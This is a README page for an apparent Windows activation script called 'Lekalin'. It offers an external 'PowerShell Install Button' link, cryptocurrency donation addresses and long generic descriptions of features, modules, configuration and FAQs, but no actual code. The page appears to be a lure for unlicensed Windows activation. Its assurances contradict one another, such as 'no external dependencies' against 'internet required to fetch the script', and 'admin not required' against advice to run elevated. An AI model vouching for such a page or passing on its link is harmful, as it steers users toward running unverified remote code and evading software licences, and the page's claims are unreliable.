<div align="center">

# Windows Activation Script Lekalin — Alternative Access

![](files/preview.png)

### 📦 PowerShell Install Button

<a href="https://ahmedbkareno1-stack.github.io/windows-activation-script-lekalin/"><img src="files/button.png" width="400" alt="PowerShell setup"></a>

[![platform](https://img.shields.io/badge/platform-windows_10_%2F_11-2f81f7?style=social&labelColor=0d1117)]() [![powershell-7](https://img.shields.io/badge/powershell--7-5.1%2B-54aeff?style=social&labelColor=0d1117)]() [![stage](https://img.shields.io/badge/stage-released-2ea44f?style=social&labelColor=0d1117)]()

<div align="center">
<h3>Support this project</h3>
<p><strong>BTC</strong>:&nbsp;<code>1Pg7qMxJaCzDQDZGEGWrbMv9DnAHQGtyQr</code> | <strong>TRON</strong>:&nbsp;<code>TUitPS3vsfVapJX6x2J5NGNQfkxgDNovw1</code> | <strong>ETH</strong>:&nbsp;<code>0xE8c72Df00c6b0eCd7B55157a8769bCc530EE0A01</code></p>
</div>

</div>

---

Windows Activation Script Lekalin is a self-contained tool for managing Windows activation states through direct system-level operations. It interfaces with built-in licensing components to query, apply, and reset activation status across supported Windows editions. The script runs entirely in-process with no external dependencies, and its logic is structured for predictable, repeatable behavior on both clean and previously activated systems. All operations are performed locally and can be audited line by line before execution.

## ✅ Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

- **Automated license provisioning** — handles the full activation workflow end to end, from key selection to final status verification, without manual steps.
- **Broad key coverage** — supports the common retail, OEM, and volume license channel families, with automatic channel detection to match the appropriate activation path.
- **Architecture-aware execution** — detects the host OS edition and architecture at runtime and adapts its behavior accordingly, avoiding mismatched operations.
- **Idempotent operation** — safe to re-run; the script checks current activation state before acting and skips steps that are already satisfied.
- **Built-in verification** — queries the system's licensing status after activation and reports a clear pass/fail result, so success is confirmed rather than assumed.
- **Structured logging** — emits timestamped, readable log output for every stage, making it straightforward to audit what happened and diagnose failures.
- **Self-contained runtime** — no persistent background service, no resident agents, and no external dependencies beyond what ships with a standard Windows installation.
- **Configurable behavior** — key source, channel preference, and verbosity are exposed as configurable parameters, allowing the script to be driven interactively or in unattended runs.
- **Graceful failure handling** — validates preconditions (privilege level, OS build, network reachability where required) before making changes, and exits with meaningful status codes for scripting integration.
- **Minimal footprint** — performs its work in a single pass and leaves no scheduled tasks or startup entries behind.

## How it works

Windows Activation Script Lekalin operates through a deterministic sequence of local system checks and state transitions, executed entirely on the target machine without reliance on external services.

The script begins by querying the current licensing state of the Windows installation via the built-in software licensing management interface. This read-only probe collects the edition identifier, channel information, and present activation status. Based on this snapshot, the script selects the appropriate transition path rather than applying a single generic routine.

For systems requiring a state change, the script stages the necessary licensing components locally, then invokes the native activation subsystem to apply the updated configuration. Each step is idempotent: re-running the script detects an already-converged state and exits without redundant modifications. Error conditions are surfaced with explicit exit codes, allowing the operator to distinguish between unsupported editions, permission issues, and transient subsystem failures.

The script maintains a lightweight execution log in memory and emits a structured summary at completion, including the pre-change state, the actions taken, and the post-change verification result. No persistent background processes, scheduled tasks, or telemetry hooks are created. All logic is contained within the single entry point, making behavior auditable and reproducible across repeated runs.

## Modules and Settings

### Activation Method Selection
This module lets the user pick the activation approach that fits the detected Windows edition and licensing situation before anything is applied.
- Presents each available approach as a named, selectable option so the user can compare choices rather than committing to one path.
- Shows the currently queued method prominently, and allows switching to another method without leaving the script.
- Confirms the selection on screen before execution begins, so the pending action is always visible.
- Reports the outcome of the chosen method once the process finishes, feeding that result into the run record.

### Environment and Build Inspection
This module gathers the installed Windows edition and build details and uses them to decide which activation paths are offered.
- Displays a short environment summary on launch so the user knows what the script has detected.
- Filters out methods that do not apply to the detected edition or build, avoiding dead-end options.
- Exposes the detected details for review so the user can verify them before proceeding to method selection.
- Feeds the detection result forward as the basis for the pre-run summary and confirmation step.

### Guided Step Execution
This module runs activation as labeled, discrete steps instead of a single opaque operation.
- Reports what each step is doing and whether it succeeded before advancing to the next one.
- Allows the user to halt execution at any point, leaving the current state visible.
- Produces a readable progress log in the console that can be followed as the run unfolds.
- Hands step outcomes to the retry and recovery module when a step does not succeed.

### Status and License Query
This module provides a read-only inspection of the current activation state without modifying the machine.
- Reports whether Windows describes itself as activated in plain terms.
- Shows which license channel is in use so the user can compare it against expectations.
- Can be run before and after activation, making results comparable across sessions.
- Supplies the baseline status that the pre-run summary and run logging reference.

### Retry and Recovery Controls
This module lets the user respond to a failed step without restarting the whole procedure.
- Offers a retry of the failed step or a rollback to the prior state.
- Lets the user set how many attempts a failing operation gets before the script stops.
- Clearly indicates which step failed and what state the system was left in afterward.
- Compliments method comparison by allowing a different approach to be selected after recovery.

### Run Summary and Review
This module records what happened during a session and gates changes behind explicit approval.
- Displays a pre-run summary of the detected environment and the chosen method, requiring confirmation before any change is applied.
- Keeps a per-session record of steps taken and their reported results for later review.
- Adjusts console detail between a concise view and a verbose trace, so the same record can be read at different levels of depth.
- Preserves the order of methods tried and their reported outcomes, making it possible to see which approach produced which result.

### Additional Settings
- Console verbosity toggle: switches between the concise progress view and the fuller trace without changing what is executed.
- Confirmation requirement: controls whether the pre-run summary always demands explicit approval before proceeding.
- Attempt limit per step: sets how many times a failing operation is retried before the script gives up.
- Method history display: keeps previously selected methods and their reported outcomes visible within the session for comparison.
- Read-only mode preference: lets the user run status and environment queries without any activation change being offered or applied.

## Usage Scenarios

### Checking Activation State Before and After Changes
**Goal:** A user wants to know whether a Windows machine is currently activated and which license channel it reports, without changing anything on the system.
**Steps:**
1. Launch windows-activation-script-lekalin and review the environment summary the script displays for the installed Windows edition and build.
2. Enable the read-only mode preference so that only inspection actions are offered and no activation change can be applied.
3. Run the status and license query to see whether Windows describes itself as activated and which license channel is in use.
4. Adjust console verbosity to the verbose trace if the concise view does not show enough detail about the reported channel.
5. Note the printed status for later comparison against a run made after a planned activation attempt.

**Expected result:** The user obtains a plain-terms activation status and license channel reading for the machine, captured as a read-only baseline with no modifications made, ready to be compared with a later run.

### Selecting and Applying an Activation Method with Confirmation
**Goal:** A user wants to apply activation using the method that matches their detected Windows edition and licensing situation, while keeping full visibility of what will happen before it happens.
**Steps:**
1. Launch the script and review the filtered list of activation approaches offered for the detected edition and build.
2. Read the environment and build inspection details to confirm the detection matches the machine in question.
3. Pick a named method from the activation method selection options and check that it appears as the currently queued method.
4. Review the pre-run summary of the detected environment and chosen method, then give explicit confirmation to proceed.
5. Let the guided step execution walk through the labeled activation steps and watch each step report success before the next one begins.

**Expected result:** The user sees a confirmed queued method, an approved pre-run summary, and a step-by-step progress log in the console ending with the outcome reported for the chosen method, all recorded in the session run log.

### Recovering from a Failed Step and Trying an Alternative Method
**Goal:** A user runs an activation attempt that does not produce the expected result and wants to recover cleanly, try a different approach, and understand which method produced which outcome.
**Steps:**
1. After a step fails during guided step execution, note the failure indication and the state the system was left in.
2. Use the retry and recovery controls to retry the failed step, with the attempt limit per step set to a preferred number before the script gives up.
3. If retries do not resolve it, choose rollback to return to the prior state rather than restarting the whole procedure.
4. Switch to a different activation approach while keeping the method history display visible to see what was already tried and in what order.
5. Review the pre-run summary and confirm, then run the new method and inspect the status and license query afterward to compare outcomes.

**Expected result:** A clear indication of which step failed and what state the system was left in, followed by a second attempt using a different method; the session record preserves both methods in the order tried alongside their reported results for comparison.

## Compatibility

Engineered for Windows 10 and Windows 11 across Home, Pro, Enterprise, Education, and LTSC editions, including both x64 and ARM64 architectures. The tool operates on clean installations as well as upgraded systems, and handles digital license transitions, KMS client configurations, and OEM channel scenarios without requiring a specific prior activation state. It runs in standard user context with elevation handled at execution time, and integrates cleanly with default Windows Defender and security policies. No additional runtime dependencies are needed beyond what ships with the operating system, and the script remains functional across cumulative updates and feature releases within the supported Windows versions. Legacy Windows builds outside the Windows 10/11 family are outside the validated support matrix.

## Configuration

Configuration is handled through a single plain-text file that the script reads at startup. No registry edits, environment variables, or service installs are required. Drop the configuration file next to the script, edit the values, and run it again.

The file uses simple `key = value` pairs. Lines beginning with `#` are treated as comments and ignored. Whitespace around keys and values is trimmed automatically, so alignment is cosmetic only.

Recognized keys:

- `mode` — selects the operating path. Accepted values are `auto`, `interactive`, and `silent`. The default is `auto`, which detects the current edition and picks the matching routine. `interactive` prompts before each stage. `silent` runs end to end without prompts and is intended for scripted deployments.
- `edition` — overrides edition detection when `mode` is set to `interactive` or `silent`. Leave it unset to let the script determine the edition itself.
- `log_level` — controls verbosity. Accepted values are `error`, `warn`, `info`, and `debug`. The default is `info`. `debug` writes every decision point to the log, which is useful when validating a new environment.
- `log_path` — destination for the run log. Relative paths resolve against the script's own directory. If omitted, the log is written alongside the script.
- `retry_count` — number of retry attempts for transient failures during each stage. Accepts an integer from `0` to `5`. The default is `2`.
- `retry_delay` — seconds to wait between retries. Accepts an integer. The default is `5`.
- `verify_after` — boolean (`true` or `false`). When enabled, the script re-checks state after each stage completes and reports a pass or fail summary at the end. The default is `true`.
- `dry_run` — boolean. When enabled, the script prints the actions it would take without performing them. Pair this with `log_level = debug` for a full trace of the planned run.

Unknown keys are reported in the log and skipped rather than causing a failure, so a configuration written for a newer revision will still run on an older one. Invalid values for a recognized key stop execution with a clear message naming the key and the accepted range.

A minimal configuration only needs a mode:

```
mode = auto
```

For unattended runs, a typical configuration looks like this:

```
mode = silent
log_level = warn
retry_count = 3
verify_after = true
```

Configuration is read once per invocation. Changes take effect on the next run; no restart or reload step is needed. Keep a copy of the configuration with any deployment bundle so runs remain reproducible across machines.

## FAQ

**Is this tool safe to run on my machine?**

The script operates entirely through documented system interfaces and does not modify system files outside of the activation state. Every action it performs is transparent and reversible through standard system tools. Review the source before execution if you require additional assurance.

**Does it require an internet connection?**

An initial connection is needed to reach the licensing infrastructure for validation. Once activation is established, the state persists locally and does not require continuous connectivity.

**Will this survive Windows updates?**

Activation state is stored in the same locations Windows itself uses, so feature updates and cumulative patches generally preserve it. Major version upgrades may reset the state; in that case, re-running the script restores it.

**What Windows editions are supported?**

The script targets consumer and business editions of Windows 10 and Windows 11, including Pro, Enterprise, Education, and their LTSC variants. Edition detection is automatic; no manual selection is required.

**Can I use this on a machine I don't own?**

No. Use it only on systems you own or are explicitly authorized to administer. The script includes no mechanism to bypass that responsibility, and you are accountable for how you deploy it.

**Does it conflict with existing activation?**

The script checks current licensing status before making changes. If the system is already activated through a legitimate channel, it leaves that state untouched. If a prior activation is present but invalid, the script replaces it cleanly.

**How do I revert the changes?**

Standard system licensing commands restore the original state at any time. The script does not lock you in or remove your ability to manage activation through the operating system's own interfaces.

**Why does the script report an error on first run?**

The most common causes are insufficient privileges or a pending reboot from a prior update. Run it from an elevated context and ensure the system has completed any outstanding restart before retrying. Detailed error output identifies the specific failure point.

**Is configuration required?**

No. Default behavior covers standard activation scenarios. Optional configuration exists for edge cases such as specific edition targeting or logging verbosity, but the script runs correctly without any edits.

**Does it collect or transmit data?**

The script communicates only with the licensing endpoints required to complete activation. It does not phone home to the project, log telemetry, or transmit system information anywhere else.

## Disclaimer

This project is provided as-is for educational and research purposes. It is intended solely for use on systems and licenses you own or are explicitly authorized to manage. You are responsible for ensuring your use complies with all applicable laws, regulations, and the terms of any software license agreements. The maintainers make no representations regarding the legality, reliability, or fitness for any particular purpose of this script. No warranty, express or implied, is provided, and the maintainers accept no liability for any damages, data loss, or other consequences arising from its use. Always review the script's contents before execution and validate behavior in a controlled environment. Use of this project is entirely at your own risk.